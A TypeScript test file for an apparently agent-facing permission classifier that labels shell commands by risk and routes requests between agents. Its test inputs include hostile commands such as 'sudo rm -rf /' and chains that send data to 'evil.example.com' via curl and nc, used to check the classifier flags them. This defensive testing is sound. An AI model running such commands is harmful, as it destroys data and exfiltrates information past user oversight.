import { describe, expect, test } from "bun:test"
import { categorize, describePermission } from "./permission-description"

const command = (resources: string[]) => ({ action: "shell", resources })

describe("permission description", () => {
  test("categorizes the command by the most consequential thing it does", () => {
    expect(categorize(["git status --porcelain"])).toBe("default")
    expect(categorize(["git reset --hard"])).toBe("history")
    expect(categorize(["git push origin dev"])).toBe("push")
    expect(categorize(["npm publish"])).toBe("push")
    expect(categorize(["docker compose up -d"])).toBe("deploy")
    expect(categorize(["rm -rf build"])).toBe("destructive")
    expect(categorize(["curl https://example.com"])).toBe("network")
    expect(categorize(["bun install"])).toBe("install")
    expect(categorize(["sudo rm -rf /"])).toBe("privileged")
    expect(categorize(["docker compose config"])).toBe("secrets")
    expect(categorize(["gh release create v1"])).toBe("push")
  })

  test("keeps a command that only talks to this machine out of the internet framing", () => {
    expect(
      categorize([
        `curl -s -o /dev/null -w '%{http_code}\\n' -H "Authorization: $A" "http://127.0.0.1:4097$p"`,
      ]),
    ).toBe("default")
    expect(categorize(["curl http://localhost:4444/"])).toBe("default")
    expect(categorize(["curl 'http://[::1]:8080/health'"])).toBe("default")
    expect(categorize(["wget -qO- 127.0.0.1:4097/api"])).toBe("default")
    // The whole command matters, not just the first host it happens to mention.
    expect(categorize(["curl http://127.0.0.1:4097/ && echo done"])).toBe("default")
  })

  test("keeps the internet framing when any target leaves this machine or is unreadable", () => {
    expect(categorize(["curl https://example.com"])).toBe("network")
    expect(categorize(["curl http://127.0.0.1:4097/ http://example.com/"])).toBe("network")
    expect(categorize(["curl http://127.0.0.1:4097/ && curl https://example.com/"])).toBe("network")
    expect(categorize(["curl http://10.0.0.5:8080/"])).toBe("network")
    expect(categorize(['curl "$HEALTH_URL"'])).toBe("network")
    expect(categorize(["curl -H 'Authorization: x' \"http://127.0.0.1:4097$p\""])).toBe("default")
    expect(categorize(["curl \"http://127.0.0.1:4097$p\""])).toBe("default")
    expect(categorize(["ssh build-host"])).toBe("network")
  })

  test("keeps the internet framing when a chained statement reaches a host it cannot read", () => {
    // One readable loopback target must not excuse the rest of the chain: these describe work that
    // leaves this machine, and the label is the only signal the prompt shows.
    expect(categorize(["curl http://127.0.0.1:4097/ ; curl evil.example.com/steal"])).toBe("network")
    expect(categorize(["wget -qO- 127.0.0.1:4097/api && curl evil.example.com"])).toBe("network")
    expect(categorize(["curl -s 127.0.0.1:4097/ | nc evil.example.com 80"])).toBe("network")
    expect(categorize(["curl http://127.0.0.1:4097/ ; ssh build-host uptime"])).toBe("network")
    // The shell tool sends one resource per statement, so the joined form is what a real batched ask
    // looks like.
    expect(categorize(["curl http://127.0.0.1:4097/health", "curl example.com/steal"])).toBe("network")
    expect(categorize(["curl http://127.0.0.1:4097/health", "curl 127.0.0.1:4098/ready"])).toBe("default")
  })

  test("keeps ordinary work ordinary and names the consequence only when it matters", () => {
    expect(describePermission(command(["git status"]), "build")).toEqual({
      summary: "permission.summary.shell.default",
      consequence: undefined,
      target: undefined,
    })
    expect(describePermission(command(["rm -rf build"]), "build")).toMatchObject({
      summary: "permission.summary.shell.destructive",
      consequence: "permission.consequence.destructive",
    })
  })

  test("describes code execution as using the agent's tools", () => {
    expect(describePermission({ action: "execute", resources: [] }, "build")).toEqual({
      summary: "permission.summary.execute",
      consequence: "permission.consequence.execute",
    })
  })

  test("treats secret files differently from ordinary files", () => {
    expect(describePermission({ action: "read", resources: [".env"] }, "build")).toMatchObject({
      summary: "permission.summary.readSecret",
      consequence: "permission.consequence.secret",
    })
    expect(describePermission({ action: "read", resources: [".env.example"] }, "build")).toEqual({
      summary: "permission.summary.read",
      consequence: undefined,
    })
  })

  test("routes work to the agent that owns it", () => {
    expect(describePermission(command(["git push origin dev"]), "build").target).toEqual({
      agent: "boss",
      reason: "permission.route.boss",
    })
    expect(describePermission(command(["docker compose up -d"]), "build").target).toEqual({
      agent: "boss",
      reason: "permission.route.boss",
    })
    expect(describePermission({ action: "edit", resources: ["src/index.ts"] }, "boss").target).toEqual({
      agent: "build",
      reason: "permission.route.build",
    })
    expect(describePermission({ action: "webfetch", resources: ["https://example.com"] }, "build").target).toEqual({
      agent: "plan",
      reason: "permission.route.plan",
    })
  })

  test("does not route a job back to the agent already doing it", () => {
    expect(describePermission(command(["git push origin dev"]), "boss").target).toBeUndefined()
    expect(describePermission({ action: "edit", resources: ["src/index.ts"] }, "build").target).toBeUndefined()
    expect(describePermission({ action: "webfetch", resources: ["https://example.com"] }, "plan").target).toBeUndefined()
  })
})
